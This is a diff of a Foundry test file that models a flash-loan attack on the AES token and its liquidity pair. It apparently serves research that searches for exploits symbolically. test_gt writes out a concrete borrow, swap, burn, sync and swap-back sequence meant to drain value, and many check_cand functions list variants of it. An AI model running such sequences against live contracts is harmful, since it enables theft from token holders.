@@ -80,12 +80,10 @@ contract AESTest is Test, BlockLoader {
         attackContract = new AttackContract();
         attackContractAddr = address(attackContract);
         attacker = address(attackContract);
-        aes.afterDeploy(address(router), address(pair));
         // Initialize balances and mock flashloan.
         usdt.transfer(address(pair), balanceOfusdtpair);
         aes.transfer(address(pair), balanceOfaespair);
-        usdt.approve(attacker, UINT256_MAX);
-        aes.approve(attacker, UINT256_MAX);
+        aes.afterDeploy(address(router), address(pair));
     }
 
     function printBalance(string memory tips) public {
@@ -134,20 +132,48 @@ contract AESTest is Test, BlockLoader {
         return;
     }
 
-    function borrow_usdt(uint256 amount) internal {
-        usdt.transferFrom(owner, attacker, amount);
+    function borrow_owner_usdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        usdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_usdt(uint256 amount) internal {
+    function payback_owner_usdt(uint256 amount) internal {
         usdt.transfer(owner, amount);
     }
 
-    function borrow_aes(uint256 amount) internal {
-        aes.transferFrom(owner, attacker, amount);
+    function borrow_owner_aes(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        aes.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_aes(uint256 amount) internal {
+    function payback_owner_aes(uint256 amount) internal {
         aes.transfer(owner, amount);
+    }
+
+    function borrow_pair_usdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        usdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_usdt(uint256 amount) internal {
+        usdt.transfer(address(pair), amount);
+    }
+
+    function borrow_pair_aes(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        aes.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_aes(uint256 amount) internal {
+        aes.transfer(address(pair), amount);
     }
 
     function swap_pair_usdt_aes(uint256 amount) internal {
@@ -193,7 +219,7 @@ contract AESTest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_usdt(100000e18);
+        borrow_owner_usdt(100000e18);
         printBalance("After step0 ");
         swap_pair_usdt_aes(usdt.balanceOf(attacker));
         printBalance("After step1 ");
@@ -203,7 +229,7 @@ contract AESTest is Test, BlockLoader {
         printBalance("After step3 ");
         swap_pair_aes_usdt(aes.balanceOf(attacker));
         printBalance("After step4 ");
-        payback_usdt((100000e18 * 1003) / 1000);
+        payback_owner_usdt((100000e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -218,50 +244,32 @@ contract AESTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        borrow_owner_usdt(amt0);
         swap_pair_usdt_aes(amt1);
         burn_pair_aes(amt2);
         sync_pair();
         swap_pair_aes_usdt(amt3);
-        payback_usdt(amt4);
+        payback_owner_usdt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand000(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
+    function check_cand000(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        swap_pair_aes_usdt(amt3);
-        payback_usdt(amt4);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_aes(amt0);
+        burn_pair_aes(amt1);
+        payback_owner_aes(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand001(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
-    ) public {
+    function check_cand001(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        swap_pair_aes_usdt(amt3);
-        swap_pair_aes_usdt(amt4);
-        payback_usdt(amt5);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_aes(amt0);
+        burn_pair_aes(amt1);
+        payback_pair_aes(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -270,37 +278,25 @@ contract AESTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        sync_pair();
-        swap_pair_aes_usdt(amt3);
-        payback_usdt(amt4);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_aes(amt0);
+        burn_pair_aes(amt1);
+        swap_pair_aes_usdt(amt2);
+        payback_owner_aes(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand003(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
-    ) public {
+    function check_cand003(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        swap_pair_aes_usdt(amt4);
-        payback_usdt(amt5);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_aes(amt0);
+        burn_pair_aes(amt1);
+        sync_pair();
+        payback_owner_aes(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -309,41 +305,25 @@ contract AESTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        sync_pair();
-        swap_pair_aes_usdt(amt3);
-        swap_pair_aes_usdt(amt4);
-        payback_usdt(amt5);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_pair_aes(amt0);
+        burn_pair_aes(amt1);
+        swap_pair_aes_usdt(amt2);
+        payback_pair_aes(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand005(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
-    ) public {
+    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        swap_pair_aes_usdt(amt4);
-        swap_pair_aes_usdt(amt5);
-        payback_usdt(amt6);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_aes(amt0);
+        burn_pair_aes(amt1);
+        sync_pair();
+        payback_pair_aes(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -353,18 +333,15 @@ contract AESTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
         swap_pair_usdt_aes(amt1);
         burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        sync_pair();
-        swap_pair_aes_usdt(amt4);
-        payback_usdt(amt5);
+        swap_pair_aes_usdt(amt3);
+        payback_owner_usdt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -374,19 +351,15 @@ contract AESTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        burn_pair_aes(amt4);
-        swap_pair_aes_usdt(amt5);
-        payback_usdt(amt6);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_aes(amt0);
+        burn_pair_aes(amt1);
+        swap_pair_aes_usdt(amt2);
+        swap_pair_aes_usdt(amt3);
+        payback_owner_aes(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -395,21 +368,15 @@ contract AESTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_aes(amt0);
+        burn_pair_aes(amt1);
         sync_pair();
-        swap_pair_aes_usdt(amt4);
-        swap_pair_aes_usdt(amt5);
-        payback_usdt(amt6);
+        swap_pair_aes_usdt(amt2);
+        payback_owner_aes(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -419,21 +386,15 @@ contract AESTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_pair_usdt(amt0);
         swap_pair_usdt_aes(amt1);
         burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        burn_pair_aes(amt4);
-        swap_pair_aes_usdt(amt5);
-        swap_pair_aes_usdt(amt6);
-        payback_usdt(amt7);
+        swap_pair_aes_usdt(amt3);
+        payback_pair_usdt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -443,20 +404,15 @@ contract AESTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        burn_pair_aes(amt4);
-        sync_pair();
-        swap_pair_aes_usdt(amt5);
-        payback_usdt(amt6);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_pair_aes(amt0);
+        burn_pair_aes(amt1);
+        swap_pair_aes_usdt(amt2);
+        swap_pair_aes_usdt(amt3);
+        payback_pair_aes(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -465,22 +421,15 @@ contract AESTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        burn_pair_aes(amt4);
-        burn_pair_aes(amt5);
-        swap_pair_aes_usdt(amt6);
-        payback_usdt(amt7);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_pair_aes(amt0);
+        burn_pair_aes(amt1);
+        sync_pair();
+        swap_pair_aes_usdt(amt2);
+        payback_pair_aes(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -491,21 +440,16 @@ contract AESTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3,
         uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt5
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
         swap_pair_usdt_aes(amt1);
         burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        burn_pair_aes(amt4);
-        sync_pair();
-        swap_pair_aes_usdt(amt5);
-        swap_pair_aes_usdt(amt6);
-        payback_usdt(amt7);
+        swap_pair_aes_usdt(amt3);
+        swap_pair_aes_usdt(amt4);
+        payback_owner_usdt(amt5);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -515,75 +459,16 @@ contract AESTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7,
-        uint256 amt8
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt8 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
         swap_pair_usdt_aes(amt1);
         burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        burn_pair_aes(amt4);
-        burn_pair_aes(amt5);
-        swap_pair_aes_usdt(amt6);
-        swap_pair_aes_usdt(amt7);
-        payback_usdt(amt8);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand014(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        burn_pair_aes(amt4);
-        burn_pair_aes(amt5);
         sync_pair();
-        swap_pair_aes_usdt(amt6);
-        payback_usdt(amt7);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand015(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7,
-        uint256 amt8
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt8 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_aes(amt1);
-        burn_pair_aes(amt2);
-        burn_pair_aes(amt3);
-        burn_pair_aes(amt4);
-        burn_pair_aes(amt5);
-        sync_pair();
-        swap_pair_aes_usdt(amt6);
-        swap_pair_aes_usdt(amt7);
-        payback_usdt(amt8);
+        swap_pair_aes_usdt(amt3);
+        payback_owner_usdt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
